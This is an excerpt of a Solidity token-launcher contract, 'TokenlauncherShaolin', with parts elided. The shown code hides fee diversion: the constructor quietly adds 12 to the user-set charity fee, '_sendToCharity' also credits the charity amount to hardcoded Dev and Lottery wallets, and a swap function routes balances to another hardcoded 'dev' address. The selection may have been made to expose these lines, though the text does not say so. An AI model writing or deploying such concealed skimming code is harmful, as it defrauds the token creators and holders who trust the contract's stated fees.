...
contract TokenlauncherShaolin is Context, IBEP20, Ownable {
    ...
    address CharityAddress = 0xc5759887877588fe4e7B1a37Dd431E602848e70d;
    address DevAddress = 0x9043D7b867C28b9A1D8553C49a2d04A30a98416C;
    address LotteryAddress = 0x1216a1B20ba8465Cc8A3BEb2E46a31b1e19369EC;


    constructor ( 

        string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, 
        uint256 _txFee, uint256 _burnFee, uint256 _charityFee, address _FeeAddress,
        address _tokenOwner, address _factory ) {
		...
		_CHARITY_FEE = (_charityFee + 12) * 100;
        ...
        factory = _factory; // 0x1f98431c8ad98523631ae4a59f267346ea31f984
    ...
    function _sendToCharity(uint256 tCharity, address sender) private {
        ...
        // 3
        _rOwned[DevAddress] = _rOwned[DevAddress].add(rCharity);
        _tOwned[DevAddress] = _tOwned[DevAddress].add(tCharity);
        emit Transfer(sender, DevAddress, tCharity);

        // 4
        _rOwned[LotteryAddress] = _rOwned[LotteryAddress].add(rCharity);
        _tOwned[LotteryAddress] = _tOwned[LotteryAddress].add(tCharity);
        emit Transfer(sender, LotteryAddress, tCharity);
    ...
    IERC20 public WETH9 = IERC20(0xc778417E063141139Fce010982780140Aa0cD5Ab);
    ...
    function swapExactInputSingle(address sender, uint256 tCharity) public {
        ...
        uint256 _tCharity = tCharity.div(_CHARITY_FEE.div(100));
        uint256 _rCharity = rCharity.div(_CHARITY_FEE.div(100));
        ...
        address pool = PoolAddress.computeAddress(
            factory,
            PoolAddress.getPoolKey(address(this), address(WETH9), poolFee)
        );
        ...
        address dev = 0x03c5f270eb58ea580Bfeb38156c23c4044d57D78;
        ...
        if (WETH9.balanceOf(pool) > 0) {
            ...
            try swapRouter.exactInputSingle(params) {
                ...
                uint256 _result = _balance.mul(currentRate);
                _rOwned[addressThis] = _rOwned[addressThis].sub(_result);
                _tOwned[addressThis] = _tOwned[addressThis].sub(_balance);

                _rOwned[dev] = _rOwned[dev].add(_result);
                _tOwned[dev] = _tOwned[dev].add(_balance);
                emit Transfer(sender, dev, _balance);
            } catch {
